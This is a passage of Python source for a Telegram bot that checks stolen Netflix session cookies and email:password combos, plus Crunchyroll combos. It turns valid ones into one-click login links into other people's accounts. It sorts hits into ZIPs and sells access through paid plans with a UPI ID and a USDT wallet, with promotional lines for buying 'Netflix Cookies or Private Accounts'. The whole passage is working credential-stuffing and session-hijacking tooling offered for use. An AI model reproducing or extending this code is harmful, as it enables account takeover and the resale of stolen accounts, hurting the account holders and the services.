                        # Fallback 1: Double check account page directly via enhanced details
                        enhanced_check = await scraper.fetch_enhanced_account_details(cookies)
                        if enhanced_check and _details_look_valid(enhanced_check) and not enhanced_check.get("error") and enhanced_check.get("status") != "DEAD":
                            logger.info("✅ Cookie is valid via account page check!")
                            direct_link = "N/A (Import Cookies via Cookie-Editor)"
                        # Fallback to combo if available
                        if combo_match:
                            import combo_checker
                            combo_str = combo_match.group(1)
                            email, password = combo_str.split(':', 1)
                            logger.info(f"🔄 Cookies failed ({direct_link}). Falling back to combo login for {email}...")
                            
                            cookies_list = await combo_checker.check_combo_async(email, password)
                            if cookies_list:
                                cookies = cookies_list
                                logger.info(f"✅ Combo login successful! Generating link for {email}...")
                                direct_link = await scraper.generate_direct_login_link_api(cookies)
                            else:
                                await context.bot.send_message(
                                    chat_id=update.effective_chat.id,
                                    text=f"❌ Combo {index}: {email} - LOGIN FAILED"
                                )
                                failed += 1
                                results.append({'name': cookie_data['name'], 'status': 'login_failed'})
                                return
                        else:
                            if not cookies:
                                await context.bot.send_message(
                                    chat_id=update.effective_chat.id,
                                    text=f"❌ Cookie {index}: {cookie_data['name']} - NO VALID COOKIES FOUND"
                                )
                                failed += 1
                                results.append({'name': cookie_data['name'], 'status': 'no_cookies'})
                                return
                            
                            err_msg = "❌ *COOKIES EXPIRED*\n\nThe cookies you provided are invalid or expired." if direct_link == "COOKIES_EXPIRED" else "❌ *NO NFToken FOUND*\n\nCould not extract a working nftoken."
                            await _send_result_to_user(err_msg)
                            failed += 1
                            return
                            
                    if direct_link in ["COOKIES_EXPIRED", "NO_NFTOKEN_FOUND", "ERROR", "BROWSER_ERROR", "N/A"]:
                         err_msg = "❌ *COOKIES EXPIRED*\n\nThe cookies you provided are invalid or expired." if direct_link == "COOKIES_EXPIRED" else "❌ *NO NFToken FOUND*\n\nCould not extract a working nftoken."
                         await _send_result_to_user(err_msg)
                         failed += 1
                         return
                    
                    # Setup initial details
                    initial_details = {
                        'direct_login_link': direct_link,
                    }
                    
                    # Initial message WITHOUT scraping immediately
                    initial_text = f"""✅ *NFToken link generated - should work for one-click login*

🎬 *Grab Netflix Cookies or Private Accounts*
➡️ *DM Now* 👉 @iq4u8
📢 *Join OUR CHANNEL* 👉 @iq4us"""
                    
                    import uuid
                    msg_id_str = f"info_{uuid.uuid4().hex[:8]}"
                    
                    context.bot_data.setdefault('cookie_cache', {})[msg_id_str] = {
                        'cookies': cookies,
                        'direct_link': direct_link,
                        'cookie_data': cookie_data,
                        'index': index - 1
                    }
                    
                    per_item_buttons = InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton(text="💻 PC", url=direct_link.replace('/account?', '/browse?'), style="primary"),
                            InlineKeyboardButton(text="☎️ MOBILE", url=direct_link.replace('/account?', '/unsupported?'), style="success"),
                            InlineKeyboardButton(text="📺 TV", url=direct_link.replace('/account?', '/tv9?'), style="danger")
                        ],
                        [
                            InlineKeyboardButton(text="🔍 Get Info", callback_data=f"get_info:{msg_id_str}"),
                            InlineKeyboardButton(text="🔙 Back", callback_data="stop")
                        ]
                    ])

                    # 2. Reply Instantly
                    sent_msg = await _send_result_to_user(initial_text, reply_markup=per_item_buttons)
                    
                    if user_id != OWNER_ID:
                        await Database.decrement_limit(user_id)
                        
                    successful += 1
                    results.append({'name': cookie_data['name'], 'status': 'success'})
                    
                    # Store meta for callbacks
                    context.user_data.setdefault('results_meta', [])
                    while len(context.user_data['results_meta']) < len(cookies_data):
                        context.user_data['results_meta'].append({})
                    
                    context.user_data['results_meta'][index-1] = {
                        'message_id': sent_msg.message_id,
                        'cookie_name': cookie_data['name'],
                        'cookies_raw': json.dumps(cookies),
                        'direct_login_link': direct_link,
                    }
                    
                    # 3. DO NOT Schedule Background Scraping here. Wait for button click.
                        
                except Exception as e:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ Cookie {index}: {cookie_data['name']} - ERROR: {str(e)}"
                    )
                    failed += 1
                    results.append({'name': cookie_data['name'], 'status': 'error'})

        # Change the initial "Processing" message to indicate concurrent start
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg_id,
            text=f"🚀 *Processing {total_cookies} cookies concurrently...*",
            parse_mode='Markdown'
        )

        # Create a task for every cookie in the batch
        tasks = [_process_single_cookie_concurrently(cookie_data, i) for i, cookie_data in enumerate(cookies_data, 1)]
        
        # Execute all tasks at the exact same time
        await asyncio.gather(*tasks, return_exceptions=True)
        
        user_id = getattr(update.effective_user, 'id', 0)
        limits_text = "🚀 *No limits, unlimited access!*"
        if user_id != OWNER_ID:
            ref_info = await Database.get_referral_info(user_id)
            if ref_info.get('unlimited_until') and ref_info['unlimited_until'] > datetime.utcnow():
                limits_text = f"🚀 *Unlimited access until {ref_info['unlimited_until'].strftime('%Y-%m-%d')}!*"
            else:
                limits_text = f"📉 *Limits left:* {ref_info.get('limit', 0)}"

        if total_cookies > 1:
            # Send final summary
            summary = f"""📊 *PROCESSING COMPLETE*

✅ *Valid:* {successful}
❌ *Invalid/Failed:* {failed}
📁 *Total:* {total_cookies}

⚡ *Processed at:* `{datetime.now().strftime('%H:%M:%S')}`
{limits_text}"""

            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg_id,
                text=summary,
                parse_mode='Markdown'
            )
        else:
            try:
                await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=processing_msg_id)
            except:
                pass
        
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg_id,
            text=f"❌ Processing error: {str(e)}"
        )

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline buttons for proceed/next and per-item actions."""
    query = update.callback_query
    try:
        await query.answer()
    except Exception:
        pass

    data = query.data or ''
    user_data = context.user_data

    if data == 'close_menu':
        try:
            await query.message.delete()
        except Exception:
            pass
        return
        
    if data == 'admin_panel':
        if update.effective_user.id != OWNER_ID:
            return
        text = "👑 *ADMIN PANEL*\n\nSelect an action below to manage users and plans:"
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💎 Grant Plan to User", callback_data="admin:grant")],
            [InlineKeyboardButton("❌ Close", callback_data="close_menu")]
        ])
        await query.message.reply_text(text, parse_mode='Markdown', reply_markup=keyboard)
        return
        
    if data == 'admin:grant':
        if update.effective_user.id != OWNER_ID:
            return
        await query.message.reply_text("Please reply to this message with the *User ID* you want to grant a plan to:", parse_mode='Markdown')
        context.user_data['awaiting_user_id_for_plan'] = True
        return
        
    if data.startswith('admin:grant_plan:'):
        if update.effective_user.id != OWNER_ID:
            return
        days = int(data.split(':')[2])
        target_id = context.user_data.get('target_plan_user_id')
        if not target_id:
            try:
                await query.answer("Target user not found. Start again.", show_alert=True)
            except:
                pass
            return
        
        plan_names = {1: "Trial (1 Day)", 7: "Basic (7 Days)", 30: "Super (30 Days)", 180: "Pro (6 Months)"}
        plan_name = plan_names.get(days, f"Premium ({days} Days)")
        
        success = await Database.give_access(target_id, days, plan_name)
        if success:
            await query.message.edit_text(f"✅ *Success!* Granted {plan_name} plan to User `{target_id}`.", parse_mode='Markdown')
            try:
                await context.bot.send_message(chat_id=target_id, text=f"🎉 *Congratulations!*\n\nYou have been granted a Premium Plan for {days} days by the Admin! Enjoy unlimited access.", parse_mode='Markdown')
            except Exception:
                pass
        else:
            await query.message.edit_text(f"❌ User `{target_id}` not found in database.", parse_mode='Markdown')
        return


    if data.startswith('buy_plan:'):
        plan = data.split(':')[1]
        text = f"Select Payment Method for *{plan.capitalize()} Plan*:"
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="📱 UPI Payment", callback_data=f"pay:upi:{plan}")],
            [InlineKeyboardButton(text="🪙 USDT (BEP20)", callback_data=f"pay:usdt:{plan}")]
        ])
        await query.message.edit_text(text, parse_mode='Markdown', reply_markup=keyboard)
        return

    if data.startswith('pay:'):
        _, method, plan = data.split(':')
        
        if method == 'upi':
            caption = (
                f"💳 *UPI Payment for {plan.capitalize()} Plan*\n\n"
                f"🔸 *UPI ID:* `evidzone-3@oksbi`\n\n"
                f"_Send the exact amount and then click the button below to send the screenshot._"
            )
            import os
            base_dir = os.path.dirname(os.path.abspath(__file__))
            photo_path = os.path.join(base_dir, 'assets', 'upi_qr.png')
        else:
            caption = (
                f"💳 *USDT Payment for {plan.capitalize()} Plan*\n\n"
                f"🔸 *USDT (BEP20):* `0xBb907Fd3F4D4d5EbabeAaE69d5daAF2f7372B0B3`\n\n"
                f"_Send the exact amount and then click the button below to send the screenshot._"
            )
            import os
            base_dir = os.path.dirname(os.path.abspath(__file__))
            photo_path = os.path.join(base_dir, 'assets', 'usdt_qr.png')

        screenshot_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="📸 Send Screenshot", url="https://t.me/xxbga")]
        ])
        
        # Delete old text message
        try:
            await query.message.delete()
        except Exception:
            pass
            
        # Send new message with photo
        import os
        if os.path.exists(photo_path):
            with open(photo_path, 'rb') as f:
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=f,
                    caption=caption,
                    parse_mode='Markdown',
                    reply_markup=screenshot_keyboard
                )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=caption,
                parse_mode='Markdown',
                reply_markup=screenshot_keyboard
            )
        return

    if data == 'premium':
        await query.answer("Coming soon!", show_alert=True)
        return
        
    if data == 'refresh_session':
        _cleanup_session_state(context)
        await query.answer("Session refreshed!", show_alert=True)
        try:
            await query.message.delete()
        except:
            pass
        await start_command(update, context)
        return
        
    if data == 'close_account':
        try:
            await query.message.delete()
        except:
            pass
        return
        
    if data.startswith("get_info:"):
        msg_id_str = data.split(":")[1]
        cache_data = context.bot_data.get('cookie_cache', {}).get(msg_id_str)
        if not cache_data:
            try:
                await query.answer("Session expired or cookies not found!", show_alert=True)
            except:
                pass
            return
            
        try:
            await query.answer("Fetching details, please wait...")
        except:
            pass
            
        initial_text = f"""🎬 *NETFLIX ACCOUNT* 🎬

⏳ _Scraping full account details in background..._

✅ *NFToken link generated - should work for one-click login*

🎬 *Grab Netflix Cookies or Private Accounts*
➡️ *DM Now* 👉 @iq4u8
📢 *Join OUR CHANNEL* 👉 @iq4us"""

        # update keyboard to remove "Get Info"
        if query.message.reply_markup and query.message.reply_markup.inline_keyboard:
            new_keyboard = InlineKeyboardMarkup([
                row for row in query.message.reply_markup.inline_keyboard
                if not any(btn.callback_data and btn.callback_data.startswith("get_info:") for btn in row)
            ])
        else:
            new_keyboard = None

        await query.message.edit_text(initial_text, parse_mode='Markdown', reply_markup=new_keyboard)
        
        # Launch background scrape task
        initial_details = {'direct_login_link': cache_data['direct_link']}
        asyncio.create_task(_background_scrape(
            query.message, 
            cache_data['cookies'], 
            initial_details, 
            context, 
            cache_data['index'], 
            cache_data['cookie_data']
        ))
        return

    # Handle Service Selection (File or Text)
    if query.data.startswith("file_service:") or query.data.startswith("text_service:"):
        service = query.data.split(":")[1]
        context.user_data['check_mode'] = 'extract'
        await query.message.edit_text(f"✅ Selected: *{service.capitalize()}*\n🔄 *Processing...*", parse_mode='Markdown')
        context.user_data['processing_msg_id'] = query.message.message_id
        
        if query.data.startswith("text_service:"):
            text_content = context.user_data.get('pending_text_content', '')
            cookies_data = [{'name': 'Direct Input', 'content': text_content}]
            _trigger_batch(update, context, cookies_data)
            return

        file_path = context.user_data.get('pending_file_path')
        file_name = context.user_data.get('pending_file_name')
        
        from archive_parser import parse_uploaded_file_to_cookies
        cookies_data = parse_uploaded_file_to_cookies(file_path, file_name)
                        
        _trigger_batch(update, context, cookies_data)
        return

    if query.data == "referral":
        await send_referral_info(update, context)
        return
    if data.startswith('proceed:'):
        try:
            start = int(data.split(':', 1)[1])
        except Exception:
            start = 0
        await start_batch_processing(update, context, start, controller_msg_id=query.message.message_id)
        return

    if data.startswith('filter:'):
        try:
            start = int(data.split(':', 1)[1])
        except Exception:
            start = 0
        await start_filter_processing(update, context, start, controller_msg_id=query.message.message_id)
        return

    if data == 'valid_zip':
        await handle_valid_zip(update, context)
        return

    if data.startswith('valid_drop:'):
        try:
            start = int(data.split(':', 1)[1])
        except Exception:
            start = 0
        await handle_valid_drop(update, context, start)
        return

    if data.startswith('next:'):
        try:
            start = int(data.split(':', 1)[1])
        except Exception:
            start = 0
        await start_batch_processing(update, context, start, controller_msg_id=query.message.message_id)
        return

    if data == 'stop':
        user_data['force_stop'] = True
        try:
            scraper.request_abort()
        except Exception:
            pass
        _cleanup_session_state(context)
        await query.edit_message_text("⛔ Session stopped. History cleared.")
        return

    # Per-item actions
    def get_index(prefix: str) -> int | None:
        try:
            return int(data.split(':', 1)[1]) if data.startswith(prefix) else None
        except Exception:
            return None

    async def _dm_or_chat_message(text: str, reply_markup=None):
        user_id = getattr(update.effective_user, 'id', None)
        if user_id is not None:
            try:
                return await context.bot.send_message(chat_id=user_id, text=text, parse_mode='Markdown', reply_markup=reply_markup)
            except Exception as dm_err:
                try:
                    me = await context.bot.get_me()
                    bot_username = getattr(me, 'username', None)
                except Exception:
                    bot_username = None
                hint = f"\n\n➡️ Open DM with @{bot_username} and tap Start, then try again." if bot_username else ""
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Could not DM you. {text}{hint}", parse_mode='Markdown')
                return None
        return await context.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode='Markdown', reply_markup=reply_markup)

    async def _dm_or_chat_document(path: str, caption: str | None = None):
        user_id = getattr(update.effective_user, 'id', None)
        if user_id is not None:
            try:
                return await context.bot.send_document(chat_id=user_id, document=open(path, 'rb'), filename=os.path.basename(path), caption=caption)
            except Exception as dm_err:
                try:
                    me = await context.bot.get_me()
                    bot_username = getattr(me, 'username', None)
                except Exception:
                    bot_username = None
                hint = f"\n\n➡️ Open DM with @{bot_username} and tap Start, then try again." if bot_username else ""
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Could not DM you. Sending here instead.{hint}", parse_mode='Markdown')
        return await context.bot.send_document(chat_id=update.effective_chat.id, document=open(path, 'rb'), filename=os.path.basename(path), caption=caption)



async def start_batch_processing(update: Update, context: ContextTypes.DEFAULT_TYPE, start: int, controller_msg_id: int):
    """Process cookies in batches of BATCH_SIZE with Next button."""
    cookies_data = context.user_data.get('pending_cookies') or []
    total = len(cookies_data)
    if total == 0:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text="❌ Nothing to process.")
        return

    end = min(start + BATCH_SIZE, total)
    context.user_data['force_stop'] = False

    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=controller_msg_id,
        text=f"🔄 Processing {start+1}–{end} of {total}..."
    )

    # Process the slice
    slice_items = cookies_data[start:end]
    invalid_items = []
    async def _send_result_to_user(text: str, reply_markup=None):
        sent_message = None
        user_id = getattr(update.effective_user, 'id', None)
        if user_id is not None:
            try:
                sent_message = await context.bot.send_message(
                    chat_id=user_id,
                    text=text,
                    parse_mode='Markdown',
                    reply_markup=reply_markup
                )
            except Exception as dm_err:
                logger.warning(f"DM failed, falling back to chat: {dm_err}")
        if not sent_message:
            sent_message = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        if "COOKIES EXPIRED" in text or "NO NFToken FOUND" in text:
            async def delete_msg(msg):
                await asyncio.sleep(2)
                try:
                    await msg.delete()
                except Exception:
                    pass
            asyncio.create_task(delete_msg(sent_message))
        return sent_message

    async def _process_batch_item_concurrently(cookie_data, step_idx):
        if context.user_data.get('force_stop'):
            return

        cookies = parse_netflix_cookies(cookie_data['content'])
        if not cookies:
            invalid_items.append({'name': cookie_data['name'], 'content': cookie_data['content']})
            return

        async with api_semaphore:
            try:
                user_id = getattr(update.effective_user, 'id', 0)
                if user_id != OWNER_ID:
                    has_limit = await Database.check_limit(user_id)
                    if not has_limit:
                        if not context.user_data.get('limit_exhausted_notified'):
                            await _send_result_to_user("⚠️ *Daily Limit Reached!*\n\nYou have already found your maximum 10 valid accounts for today. Upgrade your plan for unlimited access!")
                            context.user_data['limit_exhausted_notified'] = True
                        context.user_data['force_stop'] = True
                        # Do not process further, but mark as invalid so batch finishes cleanly
                        invalid_items.append({'name': cookie_data['name'], 'content': cookie_data['content']})
                        return

                # 1. Generate Link Instantly (Fast API Logic)
                logger.info("🔍 API: Generating direct login link...")
                direct_link = await scraper.generate_direct_login_link_api(cookies)
                
                if direct_link in ["COOKIES_EXPIRED", "NO_NFTOKEN_FOUND", "ERROR", "BROWSER_ERROR", "N/A"]:
                    enhanced_check = await scraper.fetch_enhanced_account_details(cookies)
                    if enhanced_check and _details_look_valid(enhanced_check) and not enhanced_check.get("error") and enhanced_check.get("status") != "DEAD":
                        logger.info("✅ Cookie confirmed valid via account page fallback")
                        direct_link = "N/A (Import Cookies via Cookie-Editor)"
                    elif direct_link == "COOKIES_EXPIRED" or (enhanced_check and enhanced_check.get("status") == "DEAD"):
                        await _send_result_to_user("❌ *COOKIES EXPIRED*\n\nThe cookies you provided are invalid or expired. Please get fresh cookies from an active Netflix session.")
                        invalid_items.append({'name': cookie_data['name'], 'content': cookie_data['content']})
                        return
                    else:
                        await _send_result_to_user("❌ *NO NFToken FOUND*\n\nCould not extract a working nftoken from the cookies. The cookies may be valid but don't contain a usable nftoken for direct login.")
                        invalid_items.append({'name': cookie_data['name'], 'content': cookie_data['content']})
                        return
                
                # Setup initial details
                initial_details = {
                    'direct_login_link': direct_link,
                }
                
                # Initial message WITHOUT scraping immediately
                initial_text = f"""✅ *NFToken link generated - should work for one-click login*

🎬 *Grab Netflix Cookies or Private Accounts*
➡️ *DM Now* 👉 @iq4u8
📢 *Join OUR CHANNEL* 👉 @iq4us"""
                
                import uuid
                msg_id_str = f"info_{uuid.uuid4().hex[:8]}"
                
                context.bot_data.setdefault('cookie_cache', {})[msg_id_str] = {
                    'cookies': cookies,
                    'direct_link': direct_link,
                    'cookie_data': cookie_data,
                    'index': step_idx
                }
                
                per_item_buttons = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton(text="💻 PC", url=direct_link.replace('/account?', '/browse?'), style="primary"),
                        InlineKeyboardButton(text="📱 MOBILE", url=direct_link.replace('/account?', '/unsupported?'), style="success"),
                        InlineKeyboardButton(text="📺 TV", url=direct_link.replace('/account?', '/tv9?'), style="danger")
                    ],
                    [
                        InlineKeyboardButton(text="🔍 Get Info", callback_data=f"get_info:{msg_id_str}"),
                        InlineKeyboardButton(text="🔙 Back", callback_data="stop")
                    ]
                ])

                # Wait until right before replying to decrement
                user_id = getattr(update.effective_user, 'id', 0)
                if user_id != OWNER_ID:
                    await Database.decrement_limit(user_id)

                # 2. Reply Instantly
                sent = await _send_result_to_user(initial_text, reply_markup=per_item_buttons)
                if not sent: # if user blocked or hit error
                    return
                
                # Store meta
                context.user_data.setdefault('results_meta', [])
                while len(context.user_data['results_meta']) < len(cookies_data):
                    context.user_data['results_meta'].append({})
                context.user_data['results_meta'][step_idx] = {
                    'message_id': sent.message_id,
                    'cookie_name': cookie_data['name'],
                    'cookies_raw': json.dumps(cookies),
                    'direct_login_link': direct_link,
                }
            except Exception as e:
                invalid_items.append({'name': cookie_data['name'], 'content': cookie_data.get('content', '')})

    batch_tasks = []
    for offset, cookie_data in enumerate(slice_items):
        step_idx = start + offset
        batch_tasks.append(_process_batch_item_concurrently(cookie_data, step_idx))

    # Execute batch concurrently
    progress_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text=f"🚀 *Processing items {start+1}–{end} concurrently...*", parse_mode='Markdown')
    await asyncio.gather(*batch_tasks, return_exceptions=True)
    try:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_msg.message_id)
    except Exception:
        pass

    # Controller message with Next button or Done
    if context.user_data.get('force_stop'):
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text="⛔ Stopped.")
        return

    # Build navigation with Previous/Next
    buttons = []
    prev_start = start - BATCH_SIZE if start - BATCH_SIZE >= 0 else None
    next_start = end if end < total else None
    if prev_start is not None and next_start is not None:
        buttons.append([
            InlineKeyboardButton(text=f"⬅️ Previous {prev_start+1}–{start}", callback_data=f"next:{prev_start}"),
            InlineKeyboardButton(text=f"Next {end+1}–{min(end+BATCH_SIZE, total)} ➡️", callback_data=f"next:{end}")
        ])
    elif prev_start is not None:
        buttons.append([InlineKeyboardButton(text=f"⬅️ Previous {prev_start+1}–{start}", callback_data=f"next:{prev_start}")])
    elif next_start is not None:
        buttons.append([InlineKeyboardButton(text=f"Next {end+1}–{min(end+BATCH_SIZE, total)} ➡️", callback_data=f"next:{end}")])
    nav_markup = InlineKeyboardMarkup(buttons) if buttons else None
    
    # Move the controller message to the bottom by deleting the old one and sending a new one
    try:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=controller_msg_id)
    except Exception:
        pass
        
    new_controller = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ Done {start+1}–{end} of {total}.",
        reply_markup=nav_markup
    )
    context.user_data['processing_msg_id'] = new_controller.message_id

    # Send Invalid ZIP for this batch, if any
    if invalid_items:
        try:
            import zipfile as _zip
            import uuid as _uuid
            count = len(invalid_items)
            zip_display_name = f"{count}x Invalid.zip"
            tmp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(tmp_dir, zip_display_name)
            with _zip.ZipFile(zip_path, 'w', compression=_zip.ZIP_DEFLATED) as zf:
                for item in invalid_items:
                    fname = item['name'] or 'invalid.txt'
                    fname = re.sub(r"[\\/:*?\"<>|]", "_", fname)
                    if not fname.lower().endswith('.txt'):
                        fname = f"{fname}.txt"
                    try:
                        zf.writestr(fname, item.get('content', ''))
                    except Exception:
                        zf.writestr(f"invalid_{_uuid.uuid4().hex}.txt", item.get('content', ''))
            await context.bot.send_document(chat_id=update.effective_chat.id, document=open(zip_path, 'rb'), filename=zip_display_name, caption=f"{count} invalid cookies in this batch")
        except Exception:
            pass
        finally:
            try:
                shutil.rmtree(tmp_dir)
            except Exception:
                pass

    # Light cleanup of artifacts after finishing a batch
    _cleanup_artifacts(aggressive=False)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
        
    stats = await Database.get_stats()
    text = f"""📊 *Bot Statistics*

👥 Total Users: {stats['total_users']}
📅 Active this Week: {stats['weekly_active']}
📆 Active this Month: {stats['monthly_active']}"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
        
    text = "👑 *ADMIN PANEL*\n\nSelect an action below to manage users and plans:"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("💎 Grant Plan to User", callback_data="admin:grant")],
        [InlineKeyboardButton("❌ Close", callback_data="close_menu")]
    ])
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=keyboard)



async def start_crunchyroll_processing(update, context, start: int, controller_msg_id: int):
    cookies_data = context.user_data.get('pending_cookies') or []
    total = len(cookies_data)
    if total == 0:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text="❌ Nothing to process.")
        return

    status_msg = await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=controller_msg_id,
        text=f"⏳ *Checking {total} Crunchyroll combos in the background...*\nPlease wait.",
        parse_mode='Markdown'
    )

    valid_files = []
    invalid_files = []

    async def _process_cr_item(cookie_data):
        import crunchyroll_checker
        import re
        
        raw_content = cookie_data['content']
        content_str = raw_content.strip()
        
        if re.match(r'^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)$', content_str):
            email, password = content_str.split(':', 1)
            email, password = email.strip(), password.strip()
            
            res = await asyncio.to_thread(crunchyroll_checker.baro_retry, email, password)
            
            if res.get('st') in ['hit', 'free']:
                plan_info = f"Plan: {res.get('plan')} | Expires: {res.get('expires')} | Streams: {res.get('streams')} | Country: {res.get('country')}"
                valid_content = f"{email}:{password} | Status: {res.get('st').upper()} | {plan_info}"
                valid_files.append((cookie_data['name'], valid_content))
            else:
                invalid_files.append((cookie_data['name'], raw_content))
        else:
            invalid_files.append((cookie_data['name'], raw_content))

    tasks = []
    for item in cookies_data:
        tasks.append(asyncio.create_task(_process_cr_item(item)))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    if invalid_files:
        import zipfile
        import io
        invalid_zip_buffer = io.BytesIO()
        with zipfile.ZipFile(invalid_zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for name, txt in invalid_files:
                filename = name if name.lower().endswith('.txt') else f"{name}.txt"
                zf.writestr(filename, txt)
        
        invalid_zip_buffer.seek(0)
        invalid_zip_buffer.name = "Invalid_Crunchyroll.zip"
        try:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=invalid_zip_buffer,
                caption=f"❌ *{len(invalid_files)} Invalid Items* found. Here is the ZIP.",
                parse_mode='Markdown'
            )
        except Exception:
            pass

    context.user_data['valid_files'] = valid_files
    
    try:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=controller_msg_id)
    except Exception:
        pass
        
    if not valid_files:
        final_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"✅ *Checking Complete!*\nAll {total} combos were invalid.",
            parse_mode='Markdown'
        )
        async def _del_msg(m):
            await asyncio.sleep(2)
            try:
                await m.delete()
            except Exception:
                pass
        asyncio.create_task(_del_msg(final_msg))
        return

    text = f"✅ *Checking Complete!*\n\nFound *{len(valid_files)} Valid Crunchyroll Accounts!* 🎉\nHow would you like to receive them?"
    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="📦 All Valid ZIP", callback_data="valid_zip")],
        [InlineKeyboardButton(text="⬇️ Drop 10-10 Valid", callback_data="valid_drop:0")]
    ])
    
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=text,
        parse_mode='Markdown',
        reply_markup=keyboard
    )

async def start_filter_processing(update, context, start: int, controller_msg_id: int):
    cookies_data = context.user_data.get('pending_cookies') or []
    total = len(cookies_data)
    if total == 0:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=controller_msg_id, text="❌ Nothing to process.")
        return

    status_msg = await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=controller_msg_id,
        text=f"⏳ *Filtering {total} items in the background...*\nPlease wait.",
        parse_mode='Markdown'
    )

    valid_files = []
    invalid_files = []

    async def _process_filter_item(cookie_data, step_idx):
        import combo_checker
        import re
        
        raw_content = cookie_data['content']
        cookies = parse_netflix_cookies(raw_content)
        
        # Check if combo
        if not cookies:
            content_str = raw_content.strip()
            if re.match(r'^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)$', content_str):
                email, password = content_str.split(':', 1)
                cookies_list = await combo_checker.check_combo_async(email.strip(), password.strip())
                if cookies_list:
                    cookies = cookies_list
        
        if not cookies:
            invalid_files.append((cookie_data['name'], raw_content))
            return
            
        async with api_semaphore:
            try:
                direct_link = await scraper.generate_direct_login_link_api(cookies)
                is_valid = direct_link and str(direct_link).startswith("http")
                if not is_valid:
                    enhanced_check = await scraper.fetch_enhanced_account_details(cookies)
                    if enhanced_check and _details_look_valid(enhanced_check) and not enhanced_check.get("error") and enhanced_check.get("status") != "DEAD":
                        is_valid = True
                
                if not is_valid:
                    invalid_files.append((cookie_data['name'], raw_content))
                else:
                    user_id = getattr(update.effective_user, 'id', 0)
                    if user_id != OWNER_ID:
                        has_limit = await Database.check_limit(user_id)
                        if not has_limit:
                            if not context.user_data.get('limit_exhausted_notified'):
                                await context.bot.send_message(
                                    chat_id=user_id,
                                    text="⚠️ *Daily Limit Reached!*\n\nYou have already found your maximum 10 valid accounts for today. Upgrade your plan for unlimited access!",
                                    parse_mode='Markdown'
                                )
                                context.user_data['limit_exhausted_notified'] = True
                            return
                        await Database.decrement_limit(user_id)
                    valid_files.append((cookie_data['name'], raw_content))
            except Exception:
                invalid_files.append((cookie_data['name'], raw_content))

    tasks = []
    for idx, item in enumerate(cookies_data):
        tasks.append(asyncio.create_task(_process_filter_item(item, idx)))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Generate invalid zip
    if invalid_files:
        import zipfile
        import io
        invalid_zip_buffer = io.BytesIO()
        with zipfile.ZipFile(invalid_zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for name, txt in invalid_files:
                filename = name if name.lower().endswith('.txt') else f"{name}.txt"
                zf.writestr(filename, txt)
        
        invalid_zip_buffer.seek(0)
        invalid_zip_buffer.name = "Invalid_Cookies.zip"
        try:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=invalid_zip_buffer,
                caption=f"❌ *{len(invalid_files)} Invalid Items* found. Here is the ZIP.",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to send invalid zip: {e}")

    # Save valid files in context for the next step
    context.user_data['valid_files'] = valid_files
    
    # Delete the status message
    try:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=controller_msg_id)
    except Exception:
        pass
        
    if not valid_files:
        final_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"✅ *Filtering Complete!*\nAll {total} items were invalid.",
            parse_mode='Markdown'
        )
        async def _del_msg(m):
            await asyncio.sleep(2)
            try:
                await m.delete()
            except Exception:
                pass
        asyncio.create_task(_del_msg(final_msg))
        return

    # Ask how they want the valid cookies
    text = f"✅ *Filtering Complete!*\n\nFound *{len(valid_files)} Valid Items!* 🎉\nHow would you like to receive them?"
